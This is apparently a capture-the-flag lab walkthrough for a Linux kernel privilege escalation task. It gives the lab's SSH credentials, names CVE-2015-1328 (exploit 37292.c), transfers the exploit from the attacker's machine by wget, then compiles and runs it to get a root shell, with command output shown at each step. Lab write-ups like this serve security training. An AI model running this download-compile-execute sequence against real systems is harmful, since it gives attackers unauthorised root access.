TASK_5
Linux Privilege Escalation > Task 5 "Kernel Exploits"

______ssh creds______
|Username: karen    |
|Password: Password1|
---------------------


The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.

While we try to exploit this vector we have to answer to 3 questions. Lets try it on the target (its a good time to connect via ssh)
1.	Identify the kernel version
		input	:	uname -a
		outpt	:	Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
		So the kernel version is: 3.13.0-24-generic

2.	Search and find an exploit code for the kernel version of the target system
		You have to search the web for that. I will not assist you about this. But if your searching was succesfull you must have came accross with the CVE-2015-1328. Thats what we are gonna use!

3.	Run the exploit!
		Lets do this!
		First download the exploit code (it will be downloaded as "37292.c"). Then we have to find a way to transfer it to the target.

		We will not use something fancy, lets just use the http.server/wget method respectively :-)
		So in our MACHINA
		input	:	python3 -m http.server <PORT>
		outpt	:	Serving HTTP on 0.0.0.0 port <PORT> (http://0.0.0.0:<PORT>/) ...
		Its ready!

		Now lets retrieve via wget from the target
		input	:	wget http://<MACHINA>:<PORT>/37292.c
		outpt	:	...
                    		HTTP request sent, awaiting response... 200 OK
                    		Length: 5119 (5.0K) [text/plain]
                    		37292.c: Permission denied

                    		Cannot write to \u201837292.c\u2019 (Permission denied).
		As we can see the method works as we got 200 http status but we dont have the permision to write in this folder on the target, so we have to move to another destination. Typically the "tmp" folder is writeable so lets try there. Now try again!
		outpt	:	...
                    		HTTP request sent, awaiting response... 200 OK
                    		Length: 5119 (5.0K) [text/plain]
                    		Saving to: \u201837292.c\u2019
                    		...
		And yes we did it!

		Now before we run it, we have to compile it. Not manually!
		input	:	gcc 37292.c -o <COMPILED_FILE>.c
		outpt	:	//Blank. Hit "ls -la" to verify its existance

		And then we will give the compiled file the right privileges
		input	:	chmod +x <COMPILED_FILE>.c
		outpt	:	//Blank. Hit "ls -la" to verify it

		And now its ready to run!
		input	:	./<COMPILED_FILE>.c
		outpt	:	spawning threads
                    		mount #1
                    		mount #2
                    		child threads done
                    		/etc/ld.so.preload created
                    		creating shared library
		Done! A shell opened! Lets find out if its root (hit "whoami")

Now lets find the flag!
input	:	cat <PATH_TO_FLAG>
outpt	:	<FLAG>



made by @gr1m.r3ap3r
